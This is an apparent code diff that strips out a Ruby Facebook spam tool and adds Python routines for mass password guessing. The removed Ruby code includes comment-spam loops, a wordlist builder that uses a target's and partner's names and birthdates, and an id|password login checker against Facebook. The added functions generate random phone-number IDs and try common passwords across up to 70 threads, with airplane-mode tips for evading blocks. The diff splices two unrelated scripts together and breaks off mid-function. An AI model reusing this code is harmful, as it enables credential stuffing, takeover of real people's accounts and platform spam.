-      puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
-    end
-  end
-  puts ("#{$w}#{'═'*52}")
-  puts ("#{$g}[✓] Succes : #{s}")
-  puts ("#{$y}[!] Failed : #{f}")
-  puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-  print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-  FollowMenu()
-end
+#____
 
-def FollowFromFriend()
-  s = 0
-  f = 0
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Public Id : ")
-  id = gets.chomp!
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  tik ("#{$w}[+] Loading....")
-  puts ("#{$w}#{'═'*52}")
-  a = Request("#{id}?fields=friends.limit(#{limit})")
-  if a.key? ('error')
-    puts ("#{$y}[!] User Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    FollowMenu()
-  elsif !a.key? ('friends')
-    puts ("#{$y}[!] There are no friends on the account")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    FollowMenu()
-  else
-    for i in a['friends']['data']
-      name = i['name']
-      id = i['id']
-      b = Request("POST","#{id}/subscribers?")
-      if b == true
-        s += 1
-        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
-      else
-        f += 1
-        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Succes : #{s}")
-    puts ("#{$y}[!] Failed : #{f}")
-    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    FollowMenu()
-  end
-end
+def svn_digit():
+	user=[]
+	os.system('clear')
+	print(logo)
+	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
+	lines()
+	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
+	os.system('clear')
+	print(logo)
+	print('[•] MAX LIMIT [50000]')
+	lines()
+	limit = int(input('[•] ENTER LIMIT :  '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	with ThreadPool(max_workers=70) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
+		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
+		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mLAST 7 DIGIT')
+		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+		lines()
+		for guru in user:
+			uid = kode+guru
+			pwx = [guru,kode+guru]
+			yaari.submit(fcrack,uid,pwx,tl)
+	print('[✓] Crack process has been completed')
+	print('[?] Idz saved in [ok.txt,cp.txt]')
+	input('Press Enter To Go Back To Menu')
+	rehan()
 
-def FollowFile()
-  s = 0
-  f = 0
-  system ("clear")
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] File Id : ")
-  file = gets.chomp!
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  tik ("#{$w}[+] Loading....")
-  puts ("#{$w}#{'═'*52}")
-  if File.file? (file)
-    files = File.readlines(file, chomp: true).uniq
-    for i in files[0...limit]
-      a = Request("#{i}?")
-      next if a.key? ('error')
-      b = Request("POST","#{a['id']}/subscribers?")
-      if b == true
-        s += 1
-        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{a['name']} #{$w}-> #{$y}#{i}")
-      else
-        f += 1
-        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{a['name']} #{$w}-> #{$y}#{i}")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Succes : #{s}")
-    puts ("#{$y}[!] Failed : #{f}")
-    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    FollowMenu()
-  else
-    puts ("#{$y}[!] File Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    FollowMenu()
-  end
-end
+#____
 
-def SharePost(link)
-  system ("clear")
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("#{$w}║-> 1. Share To Facebook")
-  puts ("#{$w}║-> 2. Share on a Friend's Timeline")
-  puts ("#{$w}║-> 3. Share on a Page")
-  puts ("#{$w}║-> 4. Share in WhatsApp")
-  puts ("#{$w}║")
-  print ("╚═#{$r}▶#{$w} ")
-  mana = gets.chomp!
-  case mana
-    when '1'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}[!] Use <> For New Line")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Message : ")
-      body = gets.chomp!
-      body = body.tr("<>","\n")
-      msg = ERB::Util.url_encode(body)
-      req = Request("POST","me/feed?link=#{link}&message=#{msg}")
-      if req.key? ('id')
-        puts ("#{$g}[✓] Succes  : #{req['id']}")
-      else
-        puts ("#{$y}[!] Failed  : nil")
-      end
-    when '2'
-      s = 0
-      f = 0
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}[!] Use <> For New Line")
-      puts ("#{$w}[!] Use @tag to mention users")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Message : ")
-      body = gets.chomp!
-      print ("#{$w}[+] Limit : ")
-      limit = gets.to_i
-      puts ("#{$w}#{'═'*52}")
-      a = Request("me?fields=friends.limit(#{limit})")
-      if a.key? ('error')
-        puts (a)
-        abort ("#{$r}[!] Error")
-      elsif !a.key? ('friends')
-         puts ("#{$y}[!] Your Account Has No Friends")
-      else
-        for i in a['friends']['data']
-          id = i['id']
-          name = i['name']
-          user = '@['+id+':]'
-          body = body.gsub("@tag",user)
-          body = body.gsub("<>","\n")
-          msg = ERB::Util.url_encode(body)
-          b = Request("POST","#{id}/feed?message=#{msg}&link=#{link}")
-          #puts b
-          if b.key? ('id')
-            s += 1
-            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
-          else
-            f += 1
-            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
-          end
-        end
-        puts ("#{$w}#{'═'*52}")
-        puts ("#{$g}[✓] Succes : #{s}")
-        puts ("#{$y}[!] Failed : #{f}")
-        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-      end
-    when '3'
-      s = 0
-      f = 0
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}[!] Use <> For New Line")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Message : ")
-      body = gets.chomp!
-      body = body.tr("<>","\n")
-      print ("#{$w}[+] Limit : ")
-      limit = gets.to_i
-      tik ("#{$w}[+] Loading....")
-      msg = ERB::Util.url_encode(body)   
-      puts ("#{$w}#{'═'*52}")
-      a = Request("me/accounts?fields=name,access_token&limit=#{limit}")
-      if !a.key? ('data')
-        puts (a)
-        abort ("#{$r}[!] Error")
-      elsif a['data'].empty?
-        puts ("#{$y}[!] Your Account Doesn't Have a Page")
-      else
-        for i in a['data']
-          name = i['name']
-          id = i['id']
-          token = i['access_token']
-          b = Request("POST",token=token,"#{id}/feed?link=#{link}&message=#{msg}")
-          if b.key? ('id')
-            s += 1
-            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
-          else
-	    f += 1
-            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
-          end
-        end
-        puts ("#{$w}#{'═'*52}")
-        puts ("#{$g}[✓] Succes : #{s}")
-        puts ("#{$y}[!] Failed : #{f}")
-        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-      end
-    when '4'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      code = system ("xdg-open --chooser whatsapp://send?text=#{link}")
-      if code
-        puts ("#{$g}[✓] Successfully Opening the WhatsApp Application")
-      else
-        puts ("#{$y}[!] Failed to Open the WhatsApp Application")
-      end
-    else
-      puts ("#{$y}[!] Invalid Input")
-  end
-end
+def ali_khan():
+	user=[]
+	os.system('clear')
+	print(logo)
+	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
+	lines()
+	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
+	os.system('clear')
+	print(logo)
+	print('[•] MAX LIMIT [50000]')
+	lines()
+	limit = int(input('[•] ENTER LIMIT :  '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	with ThreadPool(max_workers=30) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
+		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
+		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mALI + KHAN')
+		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+		lines()
+		for guru in user:
+			uid = kode+guru
+			pwx = [guru,'khankhan','khan1122','khan12','khan123','khan786']
+			yaari.submit(fcrack,uid,pwx,tl)
+	print('[✓] Crack process has been completed')
+	print('[?] Ids saved in ok.txt,cp.txt')
+	input('Press Inter To Back Menu')
+	rehan()
 
-def lain()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("#{$w}║-> 1. Write Status")
-  puts ("#{$w}║-> 2  Write Timeline")
-  puts ("#{$w}║-> 3. Create Wordlist")
-  puts ("#{$w}║-> 4. Account Checker")
-  puts ("#{$w}║-> 5. List of Groups")
-  puts ("#{$w}║-> 6. Access Token")
-  puts ("#{$w}║-> 7. Frofil Guard")
-  puts ("#{$w}║-> 8. Download Video")
-  puts ("#{$w}║-> 9. Fanpage")
-  puts ("#{$w}║-> #{$g}0. Back")
-  puts ("#{$w}║")
-  print ("╚═#{$w}▶#{$w} ")
-  mana = gets.chomp!
-  case mana
-    when '1'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}[!] Use <> For New Line")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Message : ")
-      body = gets.chomp!
-      body = body.tr("<>","\n")
-      msg = ERB::Util.url_encode(body)
-      post = Request("POST","me/feed?message=#{msg}")
-      puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : nil") if !post.key? ('id')
-      puts ("#{$w}[#{$g}✓#{$w}] Succes  : #{post['id']}") if post.key? ('id')
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      lain()
-    when '2'
-      meet = true
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}[!] Use <> For New Line")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Friend Id/Username : ")
-      user = gets.chomp!
-      print ("#{$w}[+] Message : ")
-      body = gets.chomp!
-      body = body.tr("<>","\n")
-      tik ("#{$w}[+] Loading...")
-      msg = ERB::Util.url_encode(body)
-      puts ("#{$w}#{'═'*52}")
-      a = Request("me/friends?fields=name,id,username")
-      if !a.to_s.include? (user)
-        puts ("#{$y}[!] Friends Not Found")
-      else
-        for i in a['data']
-          name = i['name']
-          username = i['username']
-          id = i['id']
-          if user == id or user == username
-            meet = false
-            post = Request("POST","#{id}/feed?message=#{msg}")
-            if post.key? ('id')
-              puts ("#{$w}[#{$g}✓#{$w}] Name   : #{name}")
-              puts ("#{$w}[#{$g}✓#{$w}] FBID   : #{id}")
-              puts ("#{$w}[#{$g}✓#{$w}] User   : #{username}")
-              puts ("#{$w}[#{$g}✓#{$w}] Status : Success")
-            else
-              puts ("#{$w}[#{$y}!#{$w}] Name   : #{name}")
-              puts ("#{$w}[#{$y}!#{$w}] FBId   : #{id}")
-              puts ("#{$w}[#{$y}!#{$w}] User   : #{username}")
-              puts ("#{$w}[#{$y}!#{$w}] Status : Failed")
-            end
-          end
-        end
-      end
-      puts ("#{$y}[!] Friends Not Found") if meet
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      lain()
-    when '3'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] First Name : ")
-      a = gets.chomp!
-      print ("#{$w}[+] Middle Name : ")
-      b = gets.chomp!
-      print ("#{$w}[+] Last Name : ")
-      c = gets.chomp!
-      print ("#{$w}[+] Nick Name : ")
-      d = gets.chomp!
-      print ("#{$w}[+] Date of birth (DDMMYY) : ")
-      e = gets.chomp!
-      f = e[0...2]
-      g = e[2...4]
-      h = e[4...]
-      puts ("#{$w}═"*52)
-      puts ("#{$w}[!] SKIP IF TARGET SINGLES")
-      print ("#{$w}[+] Girlfriend Name : ")
-      i = gets.chomp!
-      print ("#{$w}[+] Girlfriend Nickname : ")
-      j = gets.chomp!
-      print ("#{$w}[+] Date of birth (DDMMYY) : ")
-      k = gets.chomp!
-      l = k[0...2]
-      m = k[2...4]
-      n = k[4...]
-      password = "%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s" % [a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k]
-      puts ("#{$w}[+] Creating Files...")
-      save = a + '.txt'
-      File.open(save,'w') do |data|
-        tik("#{$w}[+] Pleace Wait....")
-        data << password
-        100.times{|x_x| data << a + x_x.to_s + "\n"}
-        100.times{|x_x| data << i + x_x.to_s + "\n"}
-        100.times{|x_x| data << d + x_x.to_s + "\n"}
-        100.times{|x_x| data << j + x_x.to_s + "\n"}
-      end
-      puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success "+save)
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      lain()
-    when '4'
-      ok = 0
-      cp = 0
-      die = 0
-      system ('clear')
-      puts ($logo)
-      puts ("#{$g}[ INFO ] SEPERATOR id | password")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] File : ")
-      file = gets.chomp!
-      if File.file? (file)
-        files = File.readlines(file, chomp: true).uniq
-        puts ("#{$w}[+] Total #{files.length} Account")
-        puts ("#{$w}[+] START...")
-        puts ("#{$w}#{'═'*52}")
-        for i in files
-          sep = i.split('|')
-          email = sep.first
-          pass = sep.last
-          uri = URI("https://mbasic.facebook.com/login.php")
-          req = Net::HTTP::Post.new(uri)
-          req['user-agent'] = $user_agent
-          req.set_form_data({'email'=>email,'pass'=>pass,'login'=>'submit'})
-          log = Net::HTTP.start(uri.host,uri.port,:use_ssl => true) {|http| http.request(req)}
-          res = log['set-cookie']
-          if res.include? ('c_user')
-            ok += 1
-            puts ("#{$g}[OK✓] #{email} | #{pass}")
-          elsif res.include? ('checkpoint')
-            cp += 1
-            puts ("#{$y}[CP+] #{email} | #{pass}")
-          else
-            die += 1
-            puts ("#{$r}[DIE] #{email} | #{pass}")
-          end
-        end
-        puts ("#{$w}#{'═'*52}")
-        puts ("#{$g}[✓] Total OK  : #{ok}")
-        puts ("#{$y}[+] Total CP  : #{cp}")
-        puts ("#{$r}[!] Total DIE : #{die}")
-      else
-        puts ("#{$y}[+] File Not Found")
-      end
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      lain()
-    when '5'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$w}[+] From #{$name}")
-      puts ("#{$w}[+] START...")
-      puts ("#{$w}#{'═'*52}")
-      a = Request("me/groups?limit=5000")
-      if !a.key? ('data')
-        puts (a)
-        abort ("#{$r}[!] Error")
-      elsif a['data'].empty?
-        puts ("#{$y}[!] There are no groups in your account")
-      else
-        b = a['data'].each{|i|
-          puts ("#{$g}[✓] Group Name : #{i['name']}")
-          puts ("#{$g}[✓] Group Id   : #{i['id']}")
-          puts ("#{$w}#{'═'*52}")
-        }
-        puts ("#{$g}[✓] Total Groups : #{b.length}")
-      end
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      lain()
-    when '6'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$w}[+] Your Access Token : #{$token}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      lain()
-    when '7'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      puts ("║-> #{$w}1. Enable")
-      puts ("║-> #{$w}2. Disable")
-      puts ("║-> #{$g}0. Back")
-      print ("#{$w}╚═#{$r}▶#{$w}")
-      mana = gets.chomp!
-      if mana == '1'
-        Guard()
-      elsif mana == '2'
-        Guard(on = false)
-      else
-        lain()
-      end
-    when '8'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Video Id : ")
-      id = gets.chomp!
-      puts ("#{$w}[+] Loading...")
-     # puts ("#{$w}#{'═'*52}")
-      a = Request("v10.0/#{id}?fields=source,length,from")
-      save = "Facebook-#{id}.mp4"
-      if a.key? ('source')
-        uri = URI(a['source'])
-        Net::HTTP.start(uri.hostname,uri.port,:use_ssl => true) do |http|
-          puts ("#{$w}[+] Downloading Video From #{a['from']['name']}")
-          File.open(save, "wb") {|f|
-            http.get(uri) do |str|
-              f.write(str)
-            end
-          }
-        end
-        size = File.size(save)
-        durasi = Time.at(a['length']).utc.strftime("%H:%M:%S")
-        puts ("#{$w}[#{$g}✓#{$w}] Download Complete")
-        puts ("#{$w}[#{$g}✓#{$w}] File Name : #{File.basename(save)}")
-        puts ("#{$w}[#{$g}✓#{$w}] File Size : #{size}")
-        puts ("#{$w}[#{$g}✓#{$w}] File Path : #{File.realpath(save)}")
-        puts ("#{$w}[#{$g}✓#{$w}] Duration  : #{durasi}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        lain()
-      else
-        puts ("#{$y}[!] Invalid Video Id ")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        lain()
-      end
-    when '9'
-      PageMenu()
-    when '0'
-      menu()
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.9)
-      lain()
-  end
-end
+#____________
 
-def Guard(on = true)
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % [on, $id]
-  headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth '+$token}
-  uri = URI('https://graph.facebook.com/graphql')
-  https = Net::HTTP.new(uri.host,uri.port)
-  https.use_ssl = true
-  req = Net::HTTP::Post.new(uri.path, headers)
-  req.body = data
-  res = https.request(req)
-  body = res.body
-  puts (body)
-  if body.include? ('"is_shielded":true')
-    puts ("#{$g}[✓] Activated")
-  elsif body.include? ('"is_shielded":false')
-    puts ("#{$y}[+] Deactivated")
-  else
-    puts ("#{$r}[!] Error")
-  end
-  print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-  lain()
-end
 
-def PageMenu()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("#{$w}║-> 1. Publish a Post")
-  puts ("#{$w}║-> 2. Publish a Link")
-  puts ("#{$w}║-> 3. Comment Post")
-  puts ("#{$w}║-> 4. Spam Comments")
-  puts ("#{$w}║-> 5. Delete Post")
-  puts ("#{$w}║-> 6. Access Token")
-  puts ("#{$w}║-> #{$g}0. Back")
-  puts ("#{$w}║")
-  print ("#{$w}╚═#{$r}▶#{$w}")
-  mana = gets.chomp!
-  case mana
-    when '1'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}[!] Use <> For New Line")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Your Page Id : ")
-      id = gets.chomp! ; id = id.tr(" ","")
-      print ("#{$w}[+] Message : ")
-      body = gets.chomp!
-      body = body.tr("<>","\n")
-      req = Request("me/accounts?fields=name,access_token")
-      token = req['data'].map {|i| i['access_token'] if i['id'] == id}
-      uri = URI("https://graph.facebook.com/#{id}/feed")
-      data = {"message"=>body,"access_token"=>token[0]}
-      req = Net::HTTP.post_form(uri,data)
-      post = JSON.parse(req.body)
-      puts ("#{$w}[#{$g}✓#{$w}] Success : #{post['id']}") if post.key? ('id')
-      puts ("#{$w}[#{$y}!#{$w}] Failed  : nil") if !post.key? ('id')
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      PageMenu()
-    when '2'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}[!] Use <> For New Line")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Your Page Id : ")
-      id = gets.chomp! ; id = id.tr(" ","")
-      print ("#{$w}[+] Message : ")
-      body = gets.chomp!
-      print ("#{$w}[+] Link : ")
-      link = gets.chomp!
-      body = body.tr("<>","\n")
-      req = Request("me/accounts?fields=name,access_token")
-      token = req['data'].map {|i| i['access_token'] if i['id'] == id}
-      uri = URI("https://graph.facebook.com/#{id}/feed")
-      data = {"message"=>body,"access_token"=>token[0],"link"=>link}
-      req = Net::HTTP.post_form(uri,data)
-      post = JSON.parse(req.body)
-      puts ("#{$w}[#{$g}✓#{$w}] Success : #{post['id']}") if post.key? ('id')
-      puts ("#{$w}[#{$y}!#{$w}] Failed  : nil") if !post.key? ('id')
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      PageMenu()
-    when '3'
-      s = 0
-      f = 0
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}[!] Target Must Be Page")
-      puts ("#{$w}[!] Use <> For New Line")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Your Page Id : ")
-      id = gets.chomp! ; id = id.tr(" ","")
-      print ("#{$w}[+] Target Id : ")
-      target = gets.chomp!
-      print ("#{$w}[+] Message : ")
-      body = gets.chomp!
-      msg = body.tr("<>","\n")
-      req = Request("me/accounts?fields=name,access_token")
-      token = req['data'].map {|i| i['access_token'] if i['id'] == id}[0].to_s
-      puts ("#{$w}[!] CTRL + C TO STOP")
-      puts ("#{$w}#{'═'*52}")
-      if token.match? ('EAA')
-        uri = URI("https://graph.facebook.com/v1.0/#{target}?fields=feed.limit=5000&access_token=#{token}")
-        r = Net::HTTP.get(uri)
-        a = JSON.parse(r)
-        if a.key? ('error')
-          puts a
-          puts ("#{$y}[!] Target Not Found")
-        elsif a['feed']['data'].empty?
-          puts ("#{$y}[+] No Posts")
-        else
-          for i in a['feed']['data']
-            begin
-              uri = URI("https://graph.facebook.com/#{i['id']}/comments")
-              data = {"message"=>msg,"access_token"=>token}
-              post = Net::HTTP.post_form(uri,data).body
-              res = JSON.parse(post)
-              if res.key? ('id')
-                s += 1
-                puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes -> #{i['id']}")
-              else
-                f += 1
-                puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed -> #{i['id']}")
-              end
-            rescue Interrupt
-              puts ("\n")
-              break
-            end
-          end
-          puts ("#{$w}#{'═'*52}")
-          puts ("#{$g}[✓] Succes : #{s}")
-          puts ("#{$y}[!] Failed : #{f}")
-          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-        end
-      else
-        puts ("#{$y}[!] Your Account Does Not Have A Page With Id #{id}")
-      end
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      PageMenu()
-    when '4'
-      s = 0
-      f = 0
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}[!] Use <> For New Line")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Your Page Id : ")
-      id = gets.chomp!
-      print ("#{$w}[+] Page Post Id : ")
-      posts = gets.chomp!
-      print ("#{$w}[+] Message : ")
-      body = gets.chomp!
-      body = body.tr("<>","\n")
-      puts ("#{$w}[!] CTRL + C TO STOP")
-      puts ("#{$w}#{'═'*52}")
-      req = Request("me/accounts?fields=name,access_token")
-      token = req['data'].map {|i| i['access_token'] if i['id'] == id}[0].to_s
-      if token.match? ('EAA')
-        a = Net::HTTP.get(URI("https://graph.facebook.com/#{posts}?fields=from&access_token=#{token}"))
-        b = JSON.parse(a)
-        if b.key? ('from')
-          loop do
-            begin
-              uri = URI("https://graph.facebook.com/#{posts}/comments")
-              data = {"message"=>body,"access_token"=>token}
-              req = Net::HTTP.post_form(uri,data)
-              res = JSON.parse(req.body)
-              if res.key? ('id')
-                s += 1
-                puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success -> #{posts}")
-              else
-                f += 1
-                puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed -> #{posts}")
-              end
-            rescue Interrupt
-              break
-            end
-          end
-          puts ("\n#{$w}#{'═'*52}")
-          puts ("#{$g}[✓] Succes : #{s}")
-          puts ("#{$y}[!] Failed : #{f}")
-          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-        else
-          puts (b)
-          puts ("#{$y}[!] Post Not Found")
-        end
-      else
-        puts ("#{$y}[!] Your Account Does Not Have A Page With Id #{id}")
-      end
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      PageMenu()
-    when '5'
-      s = 0
-      f = 0
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Your Page Id : ")
-      id = gets.chomp!
-      req = Request("me/accounts?fields=name,access_token")
-      token = req['data'].map {|i| i['access_token'] if i['id'] == id}[0].to_s
-      if token.match? ('EAA')
-        puts ("#{$w}[+] Page Name : #{req['data'][0]['name']}")
-        puts ("#{$w}[!] CTRL + C TO STOP")
-        puts ("#{$w}#{'═'*52}")
-        a = Net::HTTP.get(URI("https://graph.facebook.com/#{id}?fields=feed.limit(5000)&access_token=#{token}"))
-        b = JSON.parse(a)
-        if b.key? ('error')
-          puts (b)
-          abort ("#{$r}[!] Error#{$a}")
-        elsif !b.key? ('feed')
-          puts ("#{$y}[!] No Posts")
-        else
-          for i in b['feed']['data']
-            begin
-              posts = i['id']
-              uri = URI("https://graph.facebook.com/#{posts}?method=DELETE&access_token=#{token}")
-              del = Net::HTTP.get(uri)
-              if del.include? ('true')
-                s += 1
-                puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success -> #{posts}")
-              else
-                f += 1
-                puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed -> #{posts}")
-              end
-            rescue Interrupt
-              puts ("\n") ; break
-            end
-          end
-          puts ("#{$w}#{'═'*52}")
-          puts ("#{$g}[✓] Succes : #{s}")
-          puts ("#{$y}[!] Failed : #{f}")
-          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-        end
-      else
-        puts ("#{$y}[!] Your Account Does Not Have A Page With Id #{id}")
-      end
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      PageMenu()
-    when '6'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$w}[+] From #{$name}")
-      puts ("#{$w}[!] START...")
-      puts ("#{$w}#{'═'*52}")
-      req = Request("me/accounts?fields=name,access_token")
-      if req.key? ('error')
-        abort ("#{req}\n#{$r}[!] Error")
-      elsif req['data'].empty?
-        puts ("#{$y}[!] Your Account Does Not Have a Fan Page")
-      else
-        for i in req['data']
